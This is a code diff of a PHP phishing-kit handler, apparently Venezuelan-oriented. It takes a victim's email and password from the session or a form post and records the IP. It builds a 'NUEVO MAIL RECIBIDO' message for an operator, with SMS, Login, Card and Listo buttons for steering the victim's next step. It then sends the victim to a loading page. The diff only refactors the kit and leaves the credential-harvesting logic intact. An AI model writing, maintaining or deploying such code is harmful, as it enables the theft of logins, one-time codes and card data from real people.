@@ -4,10 +4,10 @@ date_default_timezone_set('America/Caracas');
 ini_set("display_errors", 0);
 
 // Incluir configuración global
-include('../settings.php');
+require_once('../config.php');
 
 $userp = $_SERVER['REMOTE_ADDR'];
-$usuario = $_SESSION['usuario'] ?? 'desconocido';
+$usuario = getUserIdentifier();
 
 // Necesitamos al menos el correo en sesión y la contraseña por POST o en sesión
 if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {
@@ -19,20 +19,20 @@ if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {
     $correo = $_SESSION['e'];
     $psswd = $passwordValue;
 
-    $msg = "📧 NUEVO MAIL RECIBIDO\n";
-    $msg .= "👤 Usuario: $usuario\n";
-    $msg .= "📩 Correo: $correo\n";
-    $msg .= "🔑 Password: $psswd\n";
-    $msg .= "🌐 IP: $userp\n";
+    $msg = " NUEVO MAIL RECIBIDO\n";
+    $msg .= " Usuario: $usuario\n";
+    $msg .= " Correo: $correo\n";
+    $msg .= " Password: $psswd\n";
+    $msg .= " IP: $userp\n";
 
     // Crear botones inline - SMS, Login, Card, Listo
     $botones = json_encode([
         'inline_keyboard' => [
             [
-                ['text' => '📩 SMS', 'callback_data' => "SMS|$usuario"],
-                ['text' => '🔁 Login', 'callback_data' => "LOGIN|$usuario"],
-                ['text' => '💳 Card', 'callback_data' => "CARD|$usuario"],
-                ['text' => '✅ Listo', 'callback_data' => "LISTO|$usuario"]
+                ['text' => ' SMS', 'callback_data' => "SMS|$usuario"],
+                ['text' => ' Login', 'callback_data' => "LOGIN|$usuario"],
+                ['text' => ' Card', 'callback_data' => "CARD|$usuario"],
+                ['text' => ' Listo', 'callback_data' => "LISTO|$usuario"]
             ]
         ]
     ]);
@@ -48,8 +48,8 @@ if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {
     unset($_SESSION['c']);
     $_SESSION['from_out'] = true;
 
-    // Redirigir a espera.php
-    header("Location: ../espera.php");
+    // Redirigir a loading.html
+    echo "<script>window.location.href='../loading.html';</script>";
     exit;
 }
 ?>
